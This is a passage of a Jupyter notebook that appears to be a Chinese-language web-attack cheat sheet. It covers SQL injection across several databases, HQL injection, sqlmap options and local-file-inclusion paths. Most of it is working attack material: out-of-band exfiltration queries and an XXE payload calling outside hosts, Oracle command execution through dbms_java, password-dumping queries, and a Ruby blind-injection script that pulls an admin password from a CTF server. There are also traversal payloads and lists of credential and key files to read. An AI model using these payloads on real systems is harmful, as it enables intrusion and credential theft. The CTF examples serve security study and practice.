   "metadata": {},
   "outputs": [],
   "source": [
    "SELECT sysobjects.name as tablename, syscolumns.name as columnname FROM sysobjects JOIN syscolumns ON sysobjects.id = syscolumns.id WHERE sysobjects.xtype = 'U' AND (syscolumns.name LIKE '%pass%' or syscolumns.name LIKE '%pwd%' or syscolumns.name LIKE '%first%');\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Unicode繞過"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "IIS 對 Unicode 編碼是可以解析的，即 s%u0065lect 會被解析為 select"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Oracle"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### SELECT語句必須包含FROM"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "未指定來源，可以用dual表"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 子字串："
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "SUBSTR('abc', 1, 1) => 'a'"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 空白字元"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "00 0A 0D 0C 09 20"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### IF語句"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "IF condition THEN true-part [ELSE false-part] END IF"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 註解："
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "--\n",
    "/**/\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 不支援 limit"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "改用 rownum\n",
    "select table_name from (select rownum no, table_name from all_tables) where no=1"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 單雙引號"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "單引號: string, date\n",
    "雙引號: identifier (table name, column name, ...)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 其它"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "SYS.DATABASE_NAME\n",
    "current database\n",
    "\n",
    "USER\n",
    "current user\n",
    "or sys.login_user\n",
    "\n",
    "SELECT role FROM session_roles\n",
    "current role\n",
    "\n",
    "SELECT privilege FROM user_sys_privs\n",
    "system privileges granted to the current user\n",
    "\n",
    "SELECT privilege FROM role_sys_privs\n",
    "privs the current role has\n",
    "\n",
    "SELECT privilege FROM session_privs\n",
    "the all privs that current user has = user_sys_privs + role_sys_privs\n",
    "\n",
    "SELECT banner FROM v$version where rownum=1\n",
    "database version\n",
    "\n",
    "SELECT host_name FROM v$instance;\n",
    "Name of the host machine\n",
    "\n",
    "utl_inaddr.get_host_address\n",
    "本機IP\n",
    "\n",
    "select utl_inaddr.get_host_name('87.87.87.87') from dual\n",
    "IP反解"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 庫名(schema)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "SELECT DISTINCT OWNER FROM ALL_TABLES"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 表名"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "SELECT OWNER, TABLE_NAME FROM ALL_TABLES"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Column"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "SELECT OWNER, TABLE_NAME, COLUMN_NAME FROM ALL_TAB_COLUMNS"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Union Based"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "Column型態必須相同\n",
    "可用NULL來避免\n",
    "UNION SELECT 1, 'aa', null FROM dual"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Time Based"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "dbms_pipe.receive_message(('a'),10)\n",
    "SELECT CASE WHEN (CONDITION_HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Error Based"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "CTXSYS.DRITHSX.SN\n",
    "SELECT * FROM news WHERE id=1 and CTXSYS.DRITHSX.SN(user, (SELECT banner FROM v$version WHERE rownum=1))=1\n",
    "\n",
    "utl_inaddr.get_host_name\n",
    "and 1=utl_inaddr.get_host_name((SQL in HERE))\n",
    "版本>=11g，需要超級用戶或授予網路權限的用戶才能用\n",
    "\n",
    "dbms_xdb_version.checkin\n",
    "and (select dbms_xdb_version.checkin((select user from dual)) from dual) is not null\n",
    "\n",
    "dbms_xdb_version.makeversioned\n",
    "and (select dbms_xdb_version.makeversioned((select user from dual)) from dual) is not null\n",
    "\n",
    "dbms_xdb_version.uncheckout\n",
    "and (select dbms_xdb_version.uncheckout((select user from dual)) from dual) is not null\n",
    "\n",
    "dbms_utility.sqlid_to_sqlhash\n",
    "and (SELECT dbms_utility.sqlid_to_sqlhash((select user from dual)) from dual) is not null"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Out of band"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "UTL_HTTP.request('http://kaibro.tw/'||(select user from dual))=1\n",
    "SYS.DBMS_LDAP.INIT()\n",
    "utl_inaddr.get_host_address()\n",
    "\n",
    "HTTPURITYPE\n",
    "SELECT HTTPURITYPE('http://30cm.club/index.php').GETCLOB() FROM DUAL;\n",
    "\n",
    "extractvalue() XXE\n",
    "SELECT extractvalue(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM \"http://'||(SELECT xxxx)||'.oob.kaibro.tw/\"> %remote;]>'),'/l') FROM dual\n",
    "新版已patch"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### users"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "select username from all_users\n",
    "lists all users of the database\n",
    "\n",
    "select name, password from sys.user$\n",
    "select username,password,account_status from dba_users"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 特殊用法"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "DBMS_XMLGEN.getXML('select user from dual')\n",
    "dbms_java.runjava('com/sun/tools/script/shell/Main -e \"var p = java.lang.Runtime.getRuntime().exec(''$cmd'');\"')\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## SQLite"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 子字串："
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "substr(“abc\",1,1) => 'a'"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Ascii function:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "unicode('d') => 100"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### length"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "length('ab') => 2"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Concatenation"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "||\n",
    "'a' || 'b' => 'ab'\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Time Delay"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "randomblob(100000000)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 空白字元"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "0A 0D 0C 09 20"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Case when"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "SQLite沒有if\n",
    "可以用Case When ... Then ...代替\n",
    "case when (條件) then ... else ... end"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 註解"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "--"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 爆表名"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "SELECT name FROM sqlite_master WHERE type='table'"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 爆表結構(含Column)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "SELECT sql FROM sqlite_master WHERE type='table'\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 其他"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "sqlite_version()\n",
    "\n",
    "sqlite無法使用\\'跳脫單引號\n",
    "\n",
    "[] 神奇用法\n",
    "CREATE TABLE a AS SELECT sql [ some shit... ]FROM sqlite_master;\n",
    "CREATE TABLE 後面也能接 SELECT condition\n",
    "https://github.com/w181496/CTF/tree/master/zer0pts2020/phpNantokaAdmin\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Boolean Based"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "https://github.com/w181496/CTF/tree/master/seccon2017-qual/sqlsrf"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# encoding: UTF-8\n",
    "\n",
    "# sqlite injection (POST method) (二分搜)\n",
    "# SECCON sqlsrf爆admin密碼 \n",
    "require 'net/http'\n",
    "require 'uri'\n",
    "\n",
    "$url = 'http://sqlsrf.pwn.seccon.jp/sqlsrf/index.cgi'\n",
    "$ans = ''\n",
    "\n",
    "(1..100).each do |i|\n",
    "    l = 48\n",
    "    r = 122\n",
    "\n",
    "    while(l <= r)\n",
    "        #puts \"left: #{l}, right: #{r}\"\n",
    "        break if l == r\n",
    "\n",
    "        mid = ((l + r) / 2)\n",
    "        $query = \"kaibro'union select '62084a9fa8872a1b917ef4442c1a734e' where (select unicode(substr(password,#{i},#{i})) from users where username='admin') > #{mid} and '1'='1\"\n",
    "        \n",
    "        res = Net::HTTP.post_form URI($url), {\"user\" => $query, \"pass\" => \"kaibro\", \"login\" => \"Login\"}\n",
    "        \n",
    "        if res.body.include? 'document.location'\n",
    "            l = mid + 1\n",
    "        else\n",
    "            r = mid\n",
    "        end\n",
    "\n",
    "    end\n",
    "    $ans += l.chr\n",
    "    puts $ans\n",
    "\n",
    "end"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## PostgreSQL"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 子字串"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "substr(\"abc\", 1, 1) => 'a'"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Ascii function"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "ascii('x') => 120"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Char function"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "chr(65) => A"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Concatenation"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "||\n",
    "'a' || 'b' => 'ab'"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Delay function"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "pg_sleep(5)\n",
    "GENERATE_SERIES(1, 1000000)\n",
    "repeat('a', 10000000)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 空白字元"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "0A 0D 0C 09 20"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### encode / decode"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "encode('123\\\\000\\\\001', 'base64') => MTIzAAE=\n",
    "decode('MTIzAAE=', 'base64') => 123\\000\\001"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 不支援limit N, M"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "limit a offset b 略過前b筆，抓出a筆出來"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 註解"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "--\n",
    "/**/"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 爆庫名"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "SELECT datname FROM pg_database"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 爆表名"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "SELECT tablename FROM pg_tables WHERE schemaname='dbname'"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 爆Column"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "SELECT column_name FROM information_schema.columns WHERE table_name='admin'"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Dump all"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "array_to_string(array(select userid||':'||password from users),',')"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 其它"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "version()\n",
    "current_database()\n",
    "\n",
    "user\n",
    "current_user\n",
    "SELECT usename FROM pg_user;\n",
    "\n",
    "current_schema\n",
    "current_query()\n",
    "inet_server_addr()\n",
    "inet_server_port()\n",
    "inet_client_addr()\n",
    "inet_client_port()\n",
    "\n",
    "type conversion\n",
    "cast(count(*) as text)\n",
    "\n",
    "md5('abc')\n",
    "replace('abcdefabcdef', 'cd', 'XX') => abXXefabXXef\n",
    "\n",
    "pg_read_file(filename, offset, length)\n",
    "讀檔\n",
    "只能讀data_directory下的\n",
    "\n",
    "pg_ls_dir(dirname)\n",
    "列目錄內容\n",
    "只能列data_directory下的\n",
    "\n",
    "PHP的pg_query()可以多語句執行\n",
    "\n",
    "lo_import(), lo_get()讀檔\n",
    "select cast(lo_import('/var/lib/postgresql/data/secret') as text) => 18440\n",
    "select cast(lo_get(18440) as text) => secret_here"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## MS Access"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 沒有註解"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "某些情況可以用%00, %16來達到類似效果"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 沒有 Stacked Queries"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 沒有 Limit"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "可以用 TOP, LAST 取代\n",
    "'UNION SELECT TOP 5 xxx FROM yyy%00"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 沒有 Sleep, Benchmark, ..."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 支援 Subquery"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "'AND (SELECT TOP 1 'xxx' FROM table)%00"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### String Concatenation"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "& (%26)\n",
    "+ (%2B)\n",
    "'UNION SELECT 'aa' %2b 'bb' FROM table%00\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Ascii Function"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "ASC()\n",
    "'UNION SELECT ASC('A') FROM table%00"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### IF THEN"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "IFF(condition, true, false)\n",
    "'UNION SELECT IFF(1=1, 'a', 'b') FROM table%00"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# ORM injection"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Hibernate"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 單引號跳脫法"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "MySQL中，單引號用\\'跳脫\n",
    "HQL中，用兩個單引號''跳脫\n",
    "\n",
    "'abc\\''or 1=(SELECT 1)--'\n",
    "在HQL是一個字串\n",
    "在MySQL是字串+額外SQL語句"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Magic Function法"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "PostgreSQL中內建query_to_xml('Arbitary SQL')\n",
    "Oracle中有dbms_xmlgen.getxml('SQL')"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## HQL injection example (pwn2win 2017)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "order=array_upper(xpath('row',query_to_xml('select (pg_read_file((select table_name from information_schema.columns limit 1)))',true,false,'')),1)\n",
    "\n",
    "Output: ERROR: could not stat file \"flag\": No such file or directory\n",
    "            "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "order=array_upper(xpath('row',query_to_xml('select (pg_read_file((select column_name from information_schema.columns limit 1)))',true,false,'')),1)\n",
    "\n",
    "Output: ERROR: could not stat file \"secret\": No such file or directory\n",
    "            "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "order=array_upper(xpath('row',query_to_xml('select (pg_read_file((select secret from flag)))',true,false,'')),1)\n",
    "\n",
    "Output: ERROR: could not stat file \"CTF-BR{bl00dsuck3rs_HQL1njection_pwn2win}\": No such file or directory\n",
    "            \n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# SQL Injection with MD5"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "$sql = \"SELECT * FROM admin WHERE pass = '\".md5($password, true).\"'\";\n",
    "\n",
    "ffifdyop\n",
    "md5: 276f722736c95d99e921722cf9ed621c\n",
    "to string: 'or'6<trash>"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# HTTP Parameter Pollution"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "id=1&id=2&id=3\n",
    "\n",
    "ASP.NET + IIS: id=1,2,3\n",
    "ASP + IIS: id=1,2,3\n",
    "PHP + Apache: id=3"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# SQLmap"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "python sqlmap.py -u 'test.kaibro.tw/a.php?id=1'\n",
    "--delay 2 #间隔两秒发送数据包\n",
    "--time-sec 2 #时间盲注 默认为5秒\n",
    "--force-ssl #请求是HTTPS使用，或者Host头后加上:443\n",
    "--identify-waf #尝试找出WAF/IPS/IDS保护 #首选\n",
    "--priv-esc #数据库进程用户权限提升\n",
    "--proxy=ip:port #代理进行注入\n",
    "--invalid-bignum #指定报错数值\n",
    "--invalid-logical #指定无效逻辑 re:id=-1的报错改成id=1 AND 1=2。\n",
    "--risk  1、会测试大部分的测试语句，\n",
    "        2、会增加基于事件的测试语句，\n",
    "        3、会增加OR语句的SQL注入测试。\n",
    "--technique #指定sqlmap使用的探测技术，默认情况下会测试所有的方式 [xml/payload目录]\n",
    "B: Boolean-based blind SQL injection（布尔型注入）\n",
    "E: Error-based SQL injection（报错型注入）\n",
    "U: UNION query SQL injection（可联合查询注入）\n",
    "S: Stacked queries SQL injection（可多语句查询注入）\n",
    "T: Time-based blind SQL injection（基于时间延迟注入）"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "庫名: --dbs\n",
    "表名: -D dbname --tables\n",
    "column: -D dbname -T tbname --columns\n",
    "    \n",
    "dump: -D dbname -T tbname --dump\n",
    "--start=1\n",
    "--stop=5566\n",
    "\n",
    "DBA? --is-dba\n",
    "爆帳密: --passwords\n",
    "看權限: --privileges\n",
    "拿shell: --os-shell\n",
    "interative SQL: --sql-shell\n",
    "讀檔: --file-read=/etc/passwd\n",
    "Delay時間: --time-sec=10\n",
    "User-Agent: --random-agent\n",
    "Thread: --threads=10\n",
    "\n",
    "Level: --level=3\n",
    "default: 1\n",
    "\n",
    "--technique\n",
    "default: BEUSTQ\n",
    "    \n",
    "Cookie: --cookie=\"abc=55667788\"\n",
    "Tor: --tor --check-tor --tor-type=SOCKS5 --tor-port=9050"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# LFI"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Linux / Unix"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Common Payload"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "./index.php\n",
    "././index.php\n",
    ".//index.php\n",
    "../../../../../../etc/passwd\n",
    "../../../../../../etc/passwd%00\n",
    "僅在5.3.0以下可用\n",
    "magic_quotes_gpc需為OFF\n",
    "....//....//....//....//etc/passwd\n",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd\n",
    "%252e/%252e/etc/passwd\n",
    "ＮＮ/ＮＮ/ＮＮ/etc/passwd\n",
    ".+./.+./.+./.+./.+./.+./.+./.+./.+./.+./etc/passwd\n",
    "static\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Config"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "/usr/local/apache2/conf/httpd.conf\n",
    "/usr/local/etc/apache2/httpd.conf\n",
    "/etc/apache2/sites-available/000-default.conf\n",
    "/etc/apache2/apache2.conf\n",
    "/etc/apache2/httpd.conf\n",
    "/etc/httpd/conf/httpd.conf\n",
    "/etc/nginx/conf.d/default.conf\n",
    "/etc/nginx/nginx.conf\n",
    "/etc/nginx/sites-enabled/default\n",
    "/etc/nginx/sites-enabled/default.conf\n",
    "/etc/mysql/my.cnf\n",
    "/etc/resolv.conf\n",
    "/etc/named.conf\n",
    "/etc/rsyslog.conf\n",
    "/etc/samba/smb.conf\n",
    "/etc/openldap/slapd.conf\n",
    "/etc/mongod.conf\n",
    "~/.tmux.conf\n",
    "$TOMCAT_HOME/conf/tomcat-users.xml\n",
    "$TOMCAT_HOME/conf/server.xml\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Log"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "/var/log/apache2/error.log\n",
    "/var/log/httpd/access_log\n",
    "/var/log/mail.log\n",
    "/var/log/auth.log\n",
    "/var/log/messages\n",
    "/var/log/secure\n",
    "/var/log/sshd.log\n",
    "/var/log/mysqld.log\n",
    "/var/log/mongodb/mongod.log\n",
    "$TOMCAT_HOME/logs/catalina.out"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### History"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    ".history\n",
    ".bash_history\n",
    ".sh_history\n",
    ".zsh_history\n",
    ".viminfo\n",
    ".php_history\n",
    ".mysql_history\n",
    ".dbshell\n",
    ".histfile\n",
    ".node_repl_history\n",
    ".python_history\n",
    ".scapy_history\n",
    ".sqlite_history\n",
    ".psql_history\n",
    ".lesshst\n",
    ".wget-hsts\n",
    ".config/fish/fish_history\n",
    ".local/share/fish/fish_history\n",
    ".ipython/profile_default/history.sqlite"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 其他"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "/proc/self/cmdline\n",
    "/proc/self/fd/[0-9]*\n",
    "/proc/self/environ\n",
    "/proc/net/fib_trie\n",
    "/proc/mounts\n",
    "/proc/net/arp\n",
    "/proc/net/tcp\n",
    "/proc/sched_debug\n",
    ".htaccess\n",
    "~/.bashrc\n",
    "~/.bash_profile\n",
    "~/.bash_logout\n",
    "~/.zshrc\n",
    "~/.aws/config\n",
    "~/.aws/credentials\n",
    "~/.boto\n",
    "~/.s3cfg\n",
    "~/.gitconfig\n",
    "~/.config/git/config\n",
    "~/.git-credentials\n",
    "~/.env\n",
    "/etc/passwd\n",
    "/etc/shadow\n",
    "/etc/hosts\n",
    "/etc/rc.d/rc.local\n",
    "/etc/boto.cfg\n",
    "/root/.ssh/id_rsa\n",
    "/root/.ssh/authorized_keys\n",
    "/root/.ssh/known_hosts\n",
    "/root/.ssh/config\n",
    "/etc/sysconfig/network-scripts/ifcfg-eth0\n",
    "/etc/exports\n",
    "/etc/crontab\n",
    "/var/spool/cron/root\n",
    "/var/spool/cron/crontabs/root\n",
    "/var/mail/<username>"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Windows"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "C:/Windows/win.ini\n",
    "C:/boot.ini\n",
    "C:/apache/logs/access.log\n",
    "../../../../../../../../../boot.ini/.......................\n",
    "%WINDIR%\\System32\\drivers\\etc\\hosts\n",
    "C:\\WINDOWS\\System32\\Config\\SAM\n",
    "C:/WINDOWS/repair/sam\n",
    "C:/WINDOWS/repair/system\n",
    "%SYSTEMROOT%\\System32\\config\\RegBack\\SAM\n",
    "%SYSTEMROOT%\\System32\\config\\RegBack\\system\n",
    "%WINDIR%\\system32\\config\\AppEvent.Evt\n",
    "%WINDIR%\\system32\\config\\SecEvent.Evt\n",
    "%WINDIR%\\iis[version].log\n",
    "%WINDIR%\\debug\\NetSetup.log\n",
    "%SYSTEMDRIVE%\\autoexec.bat\n",
    "C:\\Documents and Settings\\All Users\\Application Data\\Git\\config\n",
    "C:\\ProgramData\\Git\\config\n",
    "$env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## 環境變數"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "../../../../proc/self/environ\n",
